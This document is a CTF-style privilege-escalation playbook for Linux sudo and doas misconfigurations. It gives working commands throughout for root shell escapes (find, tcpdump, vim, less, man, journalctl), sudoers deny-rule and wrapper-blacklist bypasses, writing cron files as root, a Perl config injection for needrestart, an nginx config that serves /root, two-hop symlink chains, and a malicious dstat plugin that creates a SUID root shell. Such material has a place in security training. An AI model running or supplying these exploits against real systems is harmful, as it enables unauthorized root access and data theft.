# Sudo Misconfiguration & Symlink Chain

## When this applies

- Linux foothold; `sudo -l` reveals the user can run something as root.
- Goal: leverage the sudo grant for code execution / file read / file write as root.

## Technique

Sudo allows a user to run specific commands as another user. Common abuse:
- GTFOBins-style direct shell escape from binary
- Argument-injection bypassing DENY rules
- Wrapper-script blacklist bypass via synonymous flags
- Symlink chains where the privileged script reads files the user can rename

## Steps

### Sudo direct exploitation

```bash
# If sudo -l shows (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# tcpdump -z postrotate is a one-shot root command runner — force immediate rotation:
echo 'cat /root/root.txt > /tmp/.r; chmod 666 /tmp/.r' > /tmp/p.sh && chmod +x /tmp/p.sh
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/p.sh -Z root  # /tmp/.r is now root-owned + readable
```

### Sudoers DENY Rule Bypass

```bash
# sudo -l shows: (ALL) /path/to/script *
#                (ALL) !/path/to/script web-stop
# The DENY rule matches EXACTLY — adding extra args bypasses it

# Blocked (exact match):
sudo /path/to/script web-stop

# Bypass (extra empty string arg changes command signature):
sudo /path/to/script web-stop ""

# Also try: trailing whitespace, different quoting, wildcard args
sudo /path/to/script web-stop ''
sudo /path/to/script "web-stop" extra
```

**Key insight:** sudoers `!command arg1 arg2` negation is an EXACT string match on the full command line. Any additional argument (even empty `""`) makes it a different command that no longer matches the deny rule but still matches the broader allow rule.

### Sudo Wrapper Substring-Blacklist Bypass (synonymous flags)

When the sudoers entry points at a wrapper script (`sudo /opt/wrap_nmap.sh ...`) that filters dangerous flags via a substring/grep blacklist, the bypass is to find a flag that isn't in the blacklist but provides the same primitive. Most CLIs have multiple flag spellings — the wrapper authors usually only blacklist the popular ones.

Example — `nmap` wrapper that blacklists `-iL`, `--script`, `-oA`, `-oN`, `-oG`, `-oX`:

```bash
# File READ as elevated user — --excludefile reads the path. Errors / verbose log echo
# the file's contents back to stdout (or to whatever log the wrapper records).
sudo /opt/wrap_nmap.sh --excludefile /root/root.txt 127.0.0.1

# File READ alternative — -iR/--iflist or feeding the file via a target file flag
sudo /opt/wrap_nmap.sh --iflist                    # leaks /proc-derived data
```

```bash
# File WRITE as elevated user — any output flag the wrapper missed (-oN/-oG/-oX/-oA/--stylesheet)
# Use the target IP in a way that places attacker-chosen text in the scan output, then aim that
# output at a privileged path (cron, /etc/sudoers.d/, ~root/.ssh/authorized_keys).
sudo /opt/wrap_nmap.sh -oG /etc/cron.d/pwn 127.0.0.1
# Then craft a target that surfaces in the grepable output as a valid cron line.
```

Generalization: when a sudoers wrapper appears, list the binary's full flag namespace (`man <bin> | grep -E '^\s+-'`, `--help`, source code) and pick the synonyms the blacklist forgot. The same logic applies to `tar`, `find`, `awk`, `sed`, `vim`, `git`, `apt`, `rsync`, `tcpdump`, `wireshark` wrappers — each has multiple flag spellings for the same primitive (e.g., `tar --to-command` vs `tar -I`, `find -exec` vs `-execdir` vs `-fprint`, `git` aliases via `-c alias.X=...`).

### Config Injection (needrestart/vim/less)

**Trigger**: `sudo -l` shows NOPASSWD for tools accepting `-c` or config file flags

**needrestart (Perl config)**:

```bash
echo 'system("cat /root/flag.txt");' > /tmp/pwn.conf
sudo /usr/sbin/needrestart -c /tmp/pwn.conf -r l
```

**vim (Vimscript)**:

```bash
echo ':!sh' > /tmp/.vimrc
sudo vim -u /tmp/.vimrc
```

**less (LESSOPEN environment)**:

```bash
sudo LESSOPEN='|sh %s' less /etc/profile
```

**nginx (`-c <conf>` → arbitrary file read or write as root)**:
GTFOBins covers `nginx`, but the practical gotcha worth pinning is that the
distro default config carries `user www-data;` — when you launch
`sudo nginx -c <attacker.conf>` the master is root but the worker still drops
to a non-privileged user, so `alias /root/` returns 403. **Set `user root;`**
explicitly inside the attacker config and the worker keeps its privileges.
All `*_temp_path` directives must point at directories the *current user*
(launching `sudo`) can write — otherwise nginx fails to start with a
permission error before serving any request.

```nginx
user root;
worker_processes 1;
error_log  /tmp/n.err;
pid        /tmp/n.pid;
events { worker_connections 64; }
http {
  client_body_temp_path /tmp/n_c;
  proxy_temp_path       /tmp/n_p;
  fastcgi_temp_path     /tmp/n_f;
  uwsgi_temp_path       /tmp/n_u;
  scgi_temp_path        /tmp/n_s;
  server {
    listen 127.0.0.1:8888;
    location / { alias /root/; autoindex on; }   # readable as root
  }
}
```

Run: `sudo /usr/sbin/nginx -c /tmp/n.conf` then `curl http://127.0.0.1:8888/`. File **write** as root: swap the `location` block for `dav_methods PUT;` if the binary is built with `--with-http_dav_module` (`nginx -V 2>&1 | grep dav`).

**Pager Escape (less/more `!` shell)**: Any `sudo` command that invokes `less`/`more` as a pager allows shell escape via `!sh` or `!/bin/sh`. Common targets:

```bash
# apport-cli (CVE-2023-1326, v2.26.0 and earlier)
# 1. Generate crash file: sleep 1000 & kill -SEGV $!
# 2. Set small terminal to force pager: LINES=10 COLUMNS=80
# 3. sudo /usr/bin/apport-cli -c /var/crash/*.crash
# 4. Select V (View) → less opens → type !/bin/sh → root shell

# man pages
sudo /usr/bin/man man  # then !/bin/sh in less

# Any tool piping through less (git log, journalctl, etc.)
sudo /usr/bin/journalctl  # then !/bin/sh
```

**Key pattern**: When `sudo -l` shows ANY tool that uses a pager, try `!/bin/sh` once the pager activates. Force pager by setting `LINES` small.

### Symlink Chain Privilege Escalation

**When to use:** A privileged script (sudo, cron, SUID) reads files with user-controllable names and follows symlinks, but validates only the first hop.

**Technique — Two-hop symlink bypass:**

```bash
# Scenario: sudo script reads /var/log/app/*.log, validates symlink target
# with `ls -l` (sees relative name), but `cat` follows full chain

# Step 1: Create first hop in a writable directory (absolute symlink to target)
ln -s /root/flag.txt /tmp/hop1

# Step 2: Create second hop (relative symlink) in the monitored directory
# The relative name "hop1" passes validation — script sees "../../../tmp/hop1"
ln -s /tmp/hop1 /var/log/app/access.log

# When script does: cat /var/log/app/access.log
# Resolution: access.log -> /tmp/hop1 -> /root/flag.txt
```

**Why it works:** Script checks `ls -l` or `readlink` on the entry point and sees a relative path (passes validation). But `cat`/`read` follows the full chain transparently: entry -> intermediate -> target.

**Detection:**
- Find sudo scripts that read files with user-controllable names: `sudo -l`, check cron jobs
- Look for writable directories accessible by the privileged process
- Check if the script validates symlinks (grep for `readlink`, `ls -l`, `-L` flag)
- If validation only checks one level, two-hop chain bypasses it

## Verifying success

- The exploited command runs as root and either spawns a shell, leaks a file's contents, or writes to a root-owned path.
- `id` reports `euid=0(root)` after escape.

## doas: same surface, different syntax

`doas` (OpenBSD-derived sudo replacement, increasingly common on Alpine, void-linux, hardened distros, and minimal Docker images) shares all the same patterns. Read `/etc/doas.conf` directly when the user can't run `doas -l`:

```
permit nopass <user> as root cmd /usr/bin/dstat
permit nopass <user> as root cmd /usr/bin/<X> args <fixed-args>
```

Same exploitation tree applies — GTFOBins-style escapes, argument injection on missing `args`, wrapper-script bypass.

## Pluggable-tool privesc — writable plugin/module dir + sudo/doas

**Pattern:** any binary that loads code (Python plugin, Lua module, shared object, helper script) AT RUNTIME from a fixed directory. If the user can write to that directory AND can run the binary as root via sudo/doas, root is two commands away.

**Recipe — `dstat` (system stats utility)**

`dstat` loads `/usr/local/share/dstat/dstat_*.py` as plugins in the caller's privilege context. If `/usr/local/share/dstat/` is writable (typical when /usr/local is group-writable on misconfigured boxes, or the user is in `staff` / `admins`):

```python
# /usr/local/share/dstat/dstat_pwn.py
import os
os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')
class dstat_plugin(dstat): pass
```

Then `sudo dstat --pwn` (or `doas dstat --pwn`) loads the plugin as root. Run `/tmp/rootbash -p` for a SUID-root shell.

**Other pluggable-tool targets to check:**
- `nmap --script` with writable script dir
- `vim --cmd 'lua dofile(...)'` with writable runtimepath
- `ffmpeg -filter_complex_script` with writable filter chain
- `git config alias.<x>` exec with writable global config
- Python tools with `~/.config/<tool>/plugins/` or `/usr/lib/python3/dist-packages/<tool>/plugins/` writable

**Always:** for every entry in `sudo -l` / `doas -l`, identify the binary's plugin/module/script search path AND check write-ability with `find <path> -writable -ls`.

## Common pitfalls

- DENY rules in sudoers are EXACT-string matches on the full command line — extra args change the signature.
- Wrapper-script blacklists usually miss synonymous flags; enumerate the binary's full flag namespace before giving up.
- Pager escapes require an interactive PTY — set `LINES`/`COLUMNS` to force pager activation.
- `sudo -l` / `doas -l` may itself require a password — read `/etc/sudoers`, `/etc/sudoers.d/*`, `/etc/doas.conf` directly when readable.

## Tools

- GTFOBins (https://gtfobins.github.io/)
- LinPEAS (sudo enumeration)
